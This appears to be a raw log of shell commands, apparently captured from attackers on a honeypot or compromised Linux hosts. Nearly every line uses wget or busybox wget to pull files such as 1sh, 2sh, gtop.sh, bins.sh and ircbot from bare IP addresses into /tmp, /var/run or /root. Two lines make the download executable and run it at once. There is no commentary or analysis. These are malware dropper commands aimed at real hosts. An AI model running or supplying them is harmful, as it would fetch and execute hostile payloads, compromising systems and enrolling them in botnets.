wget http://212.92.127.196/.4 -O /tmp/..4
wget1 http://212.92.127.196/.4 -O /tmp/..4
wget http://212.92.127.196/.5 -O /tmp/..5
wget1 http://212.92.127.196/.5 -O /tmp/..5
wget http://212.92.127.196/.6 -O /tmp/..6
wget1 http://212.92.127.196/.6 -O /tmp/..6
wget http://212.92.127.196/.5 -O /tmp/..5
wget1 http://212.92.127.196/.5 -O /tmp/..5
wget http://212.92.127.196/.6 -O /tmp/..6
wget1 http://212.92.127.196/.6 -O /tmp/..6
wget http://212.92.127.196/.7 -O /tmp/..7
wget1 http://212.92.127.196/.7 -O /tmp/..7
wget http://212.92.127.196/.8 -O /tmp/..8
wget1 http://212.92.127.196/.8 -O /tmp/..8
wget http://212.92.127.196/.9 -O /tmp/..9
wget1 http://212.92.127.196/.9 -O /tmp/..9
wget http://212.92.127.196/.10 -O /tmp/..10
wget1 http://212.92.127.196/.10 -O /tmp/..10
wget http://212.92.127.196/.11 -O /tmp/..11
wget1 http://212.92.127.196/.11 -O /tmp/..11
wget http://212.92.127.196/.12 -O /tmp/..12
wget1 http://212.92.127.196/.12 -O /tmp/..12
wget http://212.92.127.196/.2 -O /tmp/..2
wget1 http://212.92.127.196/.2 -O /tmp/..2
wget http://212.92.127.196/.3 -O /tmp/..3
wget1 http://212.92.127.196/.3 -O /tmp/..3
wget http://212.92.127.196/.4 -O /tmp/..4
wget1 http://212.92.127.196/.4 -O /tmp/..4
wget http://212.92.127.196/.1 -O /tmp/..1
wget1 http://212.92.127.196/.1 -O /tmp/..1
wget http://212.92.127.196/.12 -O /tmp/..12
wget1 http://212.92.127.196/.12 -O /tmp/..12
wget http://212.92.127.196/.4 -O /tmp/..4
wget1 http://212.92.127.196/.4 -O /tmp/..4
wget http://212.92.127.196/.5 -O /tmp/..5
wget1 http://212.92.127.196/.5 -O /tmp/..5
wget http://212.92.127.196/.6 -O /tmp/..6
wget1 http://212.92.127.196/.6 -O /tmp/..6
wget http://212.92.127.196/.7 -O /tmp/..7
wget1 http://212.92.127.196/.7 -O /tmp/..7
wget http://212.92.127.196/.8 -O /tmp/..8
wget1 http://212.92.127.196/.8 -O /tmp/..8
wget http://212.92.127.196/.9 -O /tmp/..9
wget1 http://212.92.127.196/.9 -O /tmp/..9
wget http://212.92.127.196/.10 -O /tmp/..10
wget1 http://212.92.127.196/.10 -O /tmp/..10
wget http://212.92.127.196/.11 -O /tmp/..11
wget1 http://212.92.127.196/.11 -O /tmp/..11
wget http://212.92.127.196/.1 -O /tmp/..1
wget1 http://212.92.127.196/.1 -O /tmp/..1
wget http://212.92.127.196/.2 -O /tmp/..2
wget1 http://212.92.127.196/.2 -O /tmp/..2
wget http://212.92.127.196/.3 -O /tmp/..3
wget1 http://212.92.127.196/.3 -O /tmp/..3
wget1 http://212.92.127.196/.9 -O /tmp/..9
wget http://212.92.127.196/.10 -O /tmp/..10
wget1 http://212.92.127.196/.10 -O /tmp/..10
wget http://212.92.127.196/.11 -O /tmp/..11
wget1 http://212.92.127.196/.11 -O /tmp/..11
wget http://212.92.127.196/.12 -O /tmp/..12
wget1 http://212.92.127.196/.12 -O /tmp/..12
wget http://212.92.127.196/.4 -O /tmp/..4
wget1 http://212.92.127.196/.4 -O /tmp/..4
wget http://212.92.127.196/.5 -O /tmp/..5
wget1 http://212.92.127.196/.5 -O /tmp/..5
wget http://212.92.127.196/.6 -O /tmp/..6
wget1 http://212.92.127.196/.6 -O /tmp/..6
wget http://212.92.127.196/.7 -O /tmp/..7
wget1 http://212.92.127.196/.7 -O /tmp/..7
wget http://212.92.127.196/.8 -O /tmp/..8
wget1 http://212.92.127.196/.8 -O /tmp/..8
wget http://212.92.127.196/.9 -O /tmp/..9
wget http://212.92.127.196/.1 -O /tmp/..1
wget1 http://212.92.127.196/.1 -O /tmp/..1
wget http://212.92.127.196/.2 -O /tmp/..2
wget1 http://212.92.127.196/.2 -O /tmp/..2
wget http://212.92.127.196/.3 -O /tmp/..3
wget1 http://212.92.127.196/.3 -O /tmp/..3
wget http://221.229.172.44:81/f6ho chmod +x f6ho ./f6ho
wget http://212.92.127.196/.10 -O /tmp/..10
wget1 http://212.92.127.196/.10 -O /tmp/..10
wget http://212.92.127.196/.11 -O /tmp/..11
wget1 http://212.92.127.196/.11 -O /tmp/..11
wget http://212.92.127.196/.12 -O /tmp/..12
wget1 http://212.92.127.196/.12 -O /tmp/..12
wget http://212.92.127.196/.5 -O /tmp/..5
wget1 http://212.92.127.196/.5 -O /tmp/..5
wget http://212.92.127.196/.6 -O /tmp/..6
wget1 http://212.92.127.196/.6 -O /tmp/..6
wget http://212.92.127.196/.7 -O /tmp/..7
wget1 http://212.92.127.196/.7 -O /tmp/..7
wget http://212.92.127.196/.8 -O /tmp/..8
wget1 http://212.92.127.196/.8 -O /tmp/..8
wget http://212.92.127.196/.9 -O /tmp/..9
wget1 http://212.92.127.196/.9 -O /tmp/..9
wget http://212.92.127.196/.1 -O /tmp/..1
wget1 http://212.92.127.196/.1 -O /tmp/..1
wget http://212.92.127.196/.2 -O /tmp/..2
wget1 http://212.92.127.196/.2 -O /tmp/..2
wget http://212.92.127.196/.3 -O /tmp/..3
wget1 http://212.92.127.196/.3 -O /tmp/..3
wget http://212.92.127.196/.4 -O /tmp/..4
wget1 http://212.92.127.196/.4 -O /tmp/..4
wget http://212.92.127.196/.12 -O /tmp/..12
wget1 http://212.92.127.196/.12 -O /tmp/..12
wget http://212.92.127.196/.4 -O /tmp/..4
wget1 http://212.92.127.196/.4 -O /tmp/..4
wget http://212.92.127.196/.5 -O /tmp/..5
wget1 http://212.92.127.196/.5 -O /tmp/..5
wget http://212.92.127.196/.6 -O /tmp/..6
wget1 http://212.92.127.196/.6 -O /tmp/..6
wget http://212.92.127.196/.7 -O /tmp/..7
wget1 http://212.92.127.196/.7 -O /tmp/..7
wget http://212.92.127.196/.8 -O /tmp/..8
wget1 http://212.92.127.196/.8 -O /tmp/..8
wget http://212.92.127.196/.9 -O /tmp/..9
wget1 http://212.92.127.196/.9 -O /tmp/..9
wget http://212.92.127.196/.10 -O /tmp/..10
wget1 http://212.92.127.196/.10 -O /tmp/..10
wget http://212.92.127.196/.11 -O /tmp/..11
wget1 http://212.92.127.196/.11 -O /tmp/..11
wget http://212.92.127.196/.1 -O /tmp/..1
wget1 http://212.92.127.196/.1 -O /tmp/..1
wget http://212.92.127.196/.2 -O /tmp/..2
wget1 http://212.92.127.196/.2 -O /tmp/..2
wget http://212.92.127.196/.3 -O /tmp/..3
wget1 http://212.92.127.196/.3 -O /tmp/..3
wget http://221.229.172.44:81/l39ac chmod +x l39ac ./l39ac
wget1 http://212.92.127.196/.9 -O /tmp/..9
wget http://212.92.127.196/.10 -O /tmp/..10
wget1 http://212.92.127.196/.10 -O /tmp/..10
wget http://212.92.127.196/.11 -O /tmp/..11
wget1 http://212.92.127.196/.11 -O /tmp/..11
wget http://212.92.127.196/.12 -O /tmp/..12
wget1 http://212.92.127.196/.12 -O /tmp/..12
wget http://212.92.127.196/.3 -O /tmp/..3
wget1 http://212.92.127.196/.3 -O /tmp/..3
wget http://212.92.127.196/.4 -O /tmp/..4
wget1 http://212.92.127.196/.4 -O /tmp/..4
wget http://212.92.127.196/.5 -O /tmp/..5
wget1 http://212.92.127.196/.5 -O /tmp/..5
wget http://212.92.127.196/.6 -O /tmp/..6
wget1 http://212.92.127.196/.6 -O /tmp/..6
wget http://212.92.127.196/.7 -O /tmp/..7
wget1 http://212.92.127.196/.7 -O /tmp/..7
wget http://212.92.127.196/.8 -O /tmp/..8
wget1 http://212.92.127.196/.8 -O /tmp/..8
wget http://212.92.127.196/.9 -O /tmp/..9
wget http://212.92.127.196/.1 -O /tmp/..1
wget1 http://212.92.127.196/.1 -O /tmp/..1
wget http://212.92.127.196/.2 -O /tmp/..2
wget1 http://212.92.127.196/.2 -O /tmp/..2
wget gheryb.go.ro/gosh.tgz
wget https://raw.github.com/sivel/speedtest-cli/master/speedtest_cli.py
wget http://158.69.211.33/cj.sh
wget http://158.69.211.33/cj.sh
wget http://158.69.211.33/cj.sh
wget http://158.69.211.33/cj.sh
wget  -c http://104.236.84.211/x/2sh -P /tmp
wget  -qO /root/- http://104.236.84.211/x/2sh
wget  -c http://104.236.84.211/x/1sh -P /var/run
wget  -qO - http://104.236.84.211/x/1sh
wget  -qO /root/- http://104.236.84.211/x/2sh
wget  -c http://104.236.84.211/x/1sh -P /var/run
wget  -qO - http://104.236.84.211/x/1sh
wget  -c http://104.236.84.211/x/2sh -P /tmp
wget  -c http://104.236.84.211/x/1sh -P /var/run
wget  -qO /root/- http://104.236.84.211/x/2sh
wget  -qO - http://104.236.84.211/x/1sh
wget  -c http://104.236.84.211/x/2sh -P /tmp
wget  -qO /root/- http://104.236.84.211/x/2sh
wget  -c http://104.236.84.211/x/1sh -P /var/run
wget  -qO - http://104.236.84.211/x/1sh
wget  -c http://104.236.84.211/x/2sh -P /tmp
wget  -qO /root/- http://104.236.84.211/x/2sh
wget  -qO - http://104.236.84.211/x/1sh
wget  -c http://104.236.84.211/x/1sh -P /var/run
wget  -c http://104.236.84.211/x/2sh -P /tmp
wget  -qO /root/- http://104.236.84.211/x/2sh
wget  -c http://104.236.84.211/x/1sh -P /var/run
wget  -qO - http://104.236.84.211/x/1sh
wget  -c http://104.236.84.211/x/1sh -P /var/run
wget  -qO /root/- http://104.236.84.211/x/2sh
wget  -c http://104.236.84.211/x/2sh -P /tmp
wget  -qO - http://104.236.84.211/x/1sh
wget  -qO /root/- http://104.236.84.211/x/2sh
wget  -c http://104.236.84.211/x/2sh -P /tmp
wget  -qO - http://104.236.84.211/x/1sh
wget  -c http://104.236.84.211/x/1sh -P /var/run
wget  -qO /root/- http://104.236.84.211/x/2sh
wget  -c http://104.236.84.211/x/2sh -P /tmp
wget  -qO - http://104.236.84.211/x/1sh
wget  -c http://104.236.84.211/x/1sh -P /var/run
wget  -qO /root/- http://104.236.84.211/x/2sh
wget  -c http://104.236.84.211/x/2sh -P /tmp
wget  -qO - http://104.236.84.211/x/1sh
wget  -c http://104.236.84.211/x/1sh -P /var/run
wget  -c http://104.236.84.211/x/1sh -P /var/run
wget  -qO /root/- http://104.236.84.211/x/2sh
wget  -c http://104.236.84.211/x/2sh -P /tmp
wget  -qO - http://104.236.84.211/x/1sh
wget  -qO /root/- http://104.236.84.211/x/2sh
wget  -c http://104.236.84.211/x/2sh -P /tmp
wget  -qO - http://104.236.84.211/x/1sh
wget  -c http://104.236.84.211/x/1sh -P /var/run
wget  -qO /root/- http://104.236.84.211/x/2sh
wget  -c http://104.236.84.211/x/2sh -P /tmp
wget  -qO - http://104.236.84.211/x/1sh
wget  -c http://104.236.84.211/x/1sh -P /var/run
wget  -qO /root/- http://104.236.84.211/x/2sh
wget  -c http://104.236.84.211/x/2sh -P /tmp
wget  -qO - http://104.236.84.211/x/1sh
wget  -c http://104.236.84.211/x/1sh -P /var/run
wget  -c http://104.236.84.211/x/2sh -P /tmp
wget  -qO - http://104.236.84.211/x/1sh
wget  -c http://104.236.84.211/x/1sh -P /var/run
wget  -qO /root/- http://104.236.84.211/x/2sh
wget  -qO /root/- http://104.236.84.211/x/2sh
wget  -c http://104.236.84.211/x/2sh -P /tmp
wget  -qO - http://104.236.84.211/x/1sh
wget  -c http://104.236.84.211/x/1sh -P /var/run
wget  -qO /root/- http://104.236.84.211/x/2sh
wget  -c http://104.236.84.211/x/2sh -P /tmp
wget  -qO - http://104.236.84.211/x/1sh
wget  -c http://104.236.84.211/x/1sh -P /var/run
wget  -c http://104.236.84.211/x/1sh -P /var/run
wget  -qO /root/- http://104.236.84.211/x/2sh
wget  -c http://104.236.84.211/x/2sh -P /tmp
wget  -qO - http://104.236.84.211/x/1sh
wget  -qO /root/- http://104.236.84.211/x/2sh
wget  -c http://104.236.84.211/x/2sh -P /tmp
wget  -c http://104.236.84.211/x/1sh -P /var/run
wget  -qO - http://104.236.84.211/x/1sh
wget  -qO /root/- http://104.236.84.211/x/2sh
wget  -c http://104.236.84.211/x/2sh -P /tmp
wget  -qO - http://104.236.84.211/x/1sh
wget  -c http://104.236.84.211/x/1sh -P /var/run
wget  -qO /root/- http://104.236.84.211/x/2sh
wget  -c http://104.236.84.211/x/2sh -P /tmp
wget  -qO - http://104.236.84.211/x/1sh
wget  -c http://104.236.84.211/x/1sh -P /var/run
wget  -qO /root/- http://104.236.84.211/x/2sh
wget  -c http://104.236.84.211/x/2sh -P /tmp
wget  -qO - http://104.236.84.211/x/1sh
wget  -c http://104.236.84.211/x/1sh -P /var/run
wget  -qO /root/- http://104.236.84.211/x/2sh
wget  -c http://104.236.84.211/x/2sh -P /tmp
wget  -qO - http://104.236.84.211/x/1sh
wget  -c http://104.236.84.211/x/1sh -P /var/run
wget  -c http://104.236.84.211/x/1sh -P /var/run
wget  -qO /root/- http://104.236.84.211/x/2sh
wget  -c http://104.236.84.211/x/2sh -P /tmp
wget  -qO - http://104.236.84.211/x/1sh
wget  -qO /root/- http://104.236.84.211/x/2sh
wget  -c http://104.236.84.211/x/2sh -P /tmp
wget  -qO - http://104.236.84.211/x/1sh
wget  -c http://104.236.84.211/x/1sh -P /var/run
wget  -c http://104.236.84.211/x/2sh -P /tmp
wget  -c http://104.236.84.211/x/1sh -P /var/run
wget  -qO /root/- http://104.236.84.211/x/2sh
wget  -qO - http://104.236.84.211/x/1sh
wget  -qO /root/- http://104.236.84.211/x/2sh
wget  -c http://104.236.84.211/x/2sh -P /tmp
wget  -c http://104.236.84.211/x/1sh -P /var/run
wget  -qO - http://104.236.84.211/x/1sh
wget  -qO /root/- http://104.236.84.211/x/2sh
wget  -c http://104.236.84.211/x/2sh -P /tmp
wget  -c http://104.236.84.211/x/1sh -P /var/run
wget  -qO - http://104.236.84.211/x/1sh
wget  -c http://104.236.84.211/x/2sh -P /tmp
wget  -c http://104.236.84.211/x/1sh -P /var/run
wget  -qO /root/- http://104.236.84.211/x/2sh
wget  -qO - http://104.236.84.211/x/1sh
wget  -qO /root/- http://104.236.84.211/x/2sh
wget  -c http://104.236.84.211/x/2sh -P /tmp
wget  -c http://104.236.84.211/x/1sh -P /var/run
wget  -qO - http://104.236.84.211/x/1sh
wget  -c http://104.236.84.211/x/2sh -P /tmp
wget  -c http://104.236.84.211/x/1sh -P /var/run
wget  -qO /root/- http://104.236.84.211/x/2sh
wget  -qO - http://104.236.84.211/x/1sh
wget  -c http://104.236.84.211/x/2sh -P /tmp
wget  -c http://104.236.84.211/x/1sh -P /var/run
wget  -qO /root/- http://104.236.84.211/x/2sh
wget  -qO - http://104.236.84.211/x/1sh
wget  -c http://104.236.84.211/x/2sh -P /tmp
wget  -qO /root/- http://104.236.84.211/x/2sh
wget  -c http://104.236.84.211/x/1sh -P /var/run
wget  -qO - http://104.236.84.211/x/1sh
wget  -c http://104.236.84.211/x/2sh -P /tmp
wget  -qO /root/- http://104.236.84.211/x/2sh
wget  -c http://104.236.84.211/x/1sh -P /var/run
wget  -qO - http://104.236.84.211/x/1sh
wget  -c http://104.236.84.211/x/2sh -P /tmp
wget  -c http://104.236.84.211/x/1sh -P /var/run
wget  -qO /root/- http://104.236.84.211/x/2sh
wget  -qO - http://104.236.84.211/x/1sh
wget  -c http://104.236.84.211/x/2sh -P /tmp
wget  -c http://104.236.84.211/x/1sh -P /var/run
wget  -qO /root/- http://104.236.84.211/x/2sh
wget  -qO - http://104.236.84.211/x/1sh
wget  -c http://104.236.84.211/x/2sh -P /tmp
wget  -c http://104.236.84.211/x/1sh -P /var/run
wget  -qO /root/- http://104.236.84.211/x/2sh
wget  -qO - http://104.236.84.211/x/1sh
wget  -c http://104.236.84.211/x/2sh -P /tmp
wget  -c http://104.236.84.211/x/1sh -P /var/run
wget  -qO /root/- http://104.236.84.211/x/2sh
wget  -qO - http://104.236.84.211/x/1sh
wget  -c http://104.236.84.211/x/2sh -P /tmp
wget  -qO /root/- http://104.236.84.211/x/2sh
wget  -c http://104.236.84.211/x/1sh -P /var/run
wget  -qO - http://104.236.84.211/x/1sh
wget  -c http://104.236.84.211/x/2sh -P /tmp
wget  -qO /root/- http://104.236.84.211/x/2sh
wget  -qO - http://104.236.84.211/x/1sh
wget  -c http://104.236.84.211/x/1sh -P /var/run
wget  exploitninja1.16mb.com/ircbot
wget  -c http://104.236.84.211/x/2sh -P /tmp
wget  -c http://104.236.84.211/x/1sh -P /var/run
wget  -qO /root/- http://104.236.84.211/x/2sh
wget  -qO - http://104.236.84.211/x/1sh
wget  -qO /root/- http://104.236.84.211/x/2sh
wget  -c http://104.236.84.211/x/2sh -P /tmp
wget  -c http://104.236.84.211/x/1sh -P /var/run
wget  -qO - http://104.236.84.211/x/1sh
wget  -c http://104.236.84.211/x/2sh -P /tmp
wget  -qO /root/- http://104.236.84.211/x/2sh
wget  -c http://104.236.84.211/x/1sh -P /var/run
wget  -qO - http://104.236.84.211/x/1sh
wget  -c http://104.236.84.211/x/2sh -P /tmp
wget  -qO /root/- http://104.236.84.211/x/2sh
wget  -qO - http://104.236.84.211/x/1sh
wget  -c http://104.236.84.211/x/1sh -P /var/run
wget  -c http://104.236.84.211/x/2sh -P /tmp
wget  -c http://104.236.84.211/x/1sh -P /var/run
wget  -qO /root/- http://104.236.84.211/x/2sh
wget  -qO - http://104.236.84.211/x/1sh
wget  -c http://104.236.84.211/x/2sh -P /tmp
wget  -qO /root/- http://104.236.84.211/x/2sh
wget  -qO - http://104.236.84.211/x/1sh
wget  -c http://104.236.84.211/x/1sh -P /var/run
wget  -c http://104.236.84.211/x/2sh -P /tmp
wget  -qO /root/- http://104.236.84.211/x/2sh
wget  -c http://104.236.84.211/x/1sh -P /var/run
wget  -qO - http://104.236.84.211/x/1sh
wget  -c http://104.236.84.211/x/2sh -P /tmp
wget  -c http://104.236.84.211/x/1sh -P /var/run
wget  -qO /root/- http://104.236.84.211/x/2sh
wget  -qO - http://104.236.84.211/x/1sh
wget  -c http://104.236.84.211/x/2sh -P /tmp
wget  -c http://104.236.84.211/x/1sh -P /var/run
wget  -qO /root/- http://104.236.84.211/x/2sh
wget  -qO - http://104.236.84.211/x/1sh
wget  -c http://104.236.84.211/x/2sh -P /tmp
wget  -qO /root/- http://104.236.84.211/x/2sh
wget  -qO - http://104.236.84.211/x/1sh
wget  -c http://104.236.84.211/x/1sh -P /var/run
wget  -c http://104.236.84.211/x/2sh -P /tmp
wget  -qO /root/- http://104.236.84.211/x/2sh
wget  -c http://104.236.84.211/x/1sh -P /var/run
wget  -qO - http://104.236.84.211/x/1sh
wget  -c http://104.236.84.211/x/2sh -P /tmp
wget  -qO /root/- http://104.236.84.211/x/2sh
wget  -c http://104.236.84.211/x/1sh -P /var/run
wget  -qO - http://104.236.84.211/x/1sh
wget  -c http://104.236.84.211/x/2sh -P /tmp
wget  -qO /root/- http://104.236.84.211/x/2sh
wget  -qO - http://104.236.84.211/x/1sh
wget  -c http://104.236.84.211/x/1sh -P /var/run
wget  -c http://104.236.84.211/x/2sh -P /tmp
wget  -c http://104.236.84.211/x/1sh -P /var/run
wget  -qO /root/- http://104.236.84.211/x/2sh
wget  -qO - http://104.236.84.211/x/1sh
wget  -c http://104.236.84.211/x/2sh -P /tmp
wget  -qO /root/- http://104.236.84.211/x/2sh
wget  -c http://104.236.84.211/x/1sh -P /var/run
wget  -qO - http://104.236.84.211/x/1sh
wget  -c http://104.236.84.211/x/2sh -P /tmp
wget  -qO /root/- http://104.236.84.211/x/2sh
wget  -c http://104.236.84.211/x/1sh -P /var/run
wget  -qO - http://104.236.84.211/x/1sh
wget  -c http://104.236.84.211/x/2sh -P /tmp
wget  -qO - http://104.236.84.211/x/1sh
wget  -c http://104.236.84.211/x/1sh -P /var/run
wget  -qO /root/- http://104.236.84.211/x/2sh
wget  -qO /root/- http://104.236.84.211/x/2sh
wget  -c http://104.236.84.211/x/2sh -P /tmp
wget  -qO - http://104.236.84.211/x/1sh
wget  -c http://104.236.84.211/x/1sh -P /var/run
wget  -c http://104.236.84.211/x/1sh -P /var/run
wget  -qO /root/- http://104.236.84.211/x/2sh
wget  -c http://104.236.84.211/x/2sh -P /tmp
wget  -qO - http://104.236.84.211/x/1sh
wget  -qO /root/- http://104.236.84.211/x/2sh
wget  -c http://104.236.84.211/x/2sh -P /tmp
wget  -qO - http://104.236.84.211/x/1sh
wget  -c http://104.236.84.211/x/1sh -P /var/run
wget  -qO /root/- http://104.236.84.211/x/2sh
wget  -c http://104.236.84.211/x/2sh -P /tmp
wget  -qO - http://104.236.84.211/x/1sh
wget  -c http://104.236.84.211/x/1sh -P /var/run
wget  -c http://104.236.84.211/x/2sh -P /tmp
wget  -qO /root/- http://104.236.84.211/x/2sh
wget  -qO - http://104.236.84.211/x/1sh
wget  -c http://104.236.84.211/x/1sh -P /var/run
wget  -qO /root/- http://104.236.84.211/x/2sh
wget  -c http://104.236.84.211/x/2sh -P /tmp
wget  -qO - http://104.236.84.211/x/1sh
wget  -c http://104.236.84.211/x/1sh -P /var/run
wget  -c http://104.236.84.211/x/2sh -P /tmp
wget  -qO - http://104.236.84.211/x/1sh
wget  -c http://104.236.84.211/x/1sh -P /var/run
wget  -qO /root/- http://104.236.84.211/x/2sh
wget  -qO /root/- http://104.236.84.211/x/2sh
wget  -c http://104.236.84.211/x/2sh -P /tmp
wget  -qO - http://104.236.84.211/x/1sh
wget  -c http://104.236.84.211/x/1sh -P /var/run
wget  -qO /root/- http://104.236.84.211/x/2sh
wget  -c http://104.236.84.211/x/2sh -P /tmp
wget  -qO - http://104.236.84.211/x/1sh
wget  -c http://104.236.84.211/x/1sh -P /var/run
wget  -c http://104.236.84.211/x/2sh -P /tmp
wget  -qO /root/- http://104.236.84.211/x/2sh
wget  -c http://104.236.84.211/x/1sh -P /var/run
wget  -qO - http://104.236.84.211/x/1sh
busybox  wget -q http://198.144.181.15/gtop.sh
wget -q http://198.144.181.15/gtop.sh
busybox  wget -q http://198.144.181.15/gtop.sh
wget -q http://198.144.181.15/gtop.sh
busybox  wget -q http://198.144.181.15/gtop.sh
wget -q http://198.144.181.15/gtop.sh
wget  http://198.144.181.22/bins.sh
busybox  wget -q http://23.94.97.5/gtop.sh
wget -q http://23.94.97.5/gtop.sh
busybox  wget -q http://23.94.97.5/gtop.sh
wget -q http://23.94.97.5/gtop.sh
busybox  wget -q http://23.94.97.5/gtop.sh
wget -q http://23.94.97.5/gtop.sh
wget  test.py / wget catanodye.3x.ro/test.py
wget  -qO /root/- http://104.236.84.211/x/2sh
wget  -c http://104.236.84.211/x/2sh -P /tmp
wget  -c http://104.236.84.211/x/1sh -P /var/run
wget  -qO - http://104.236.84.211/x/1sh
wget  -c http://104.236.84.211/x/2sh -P /tmp
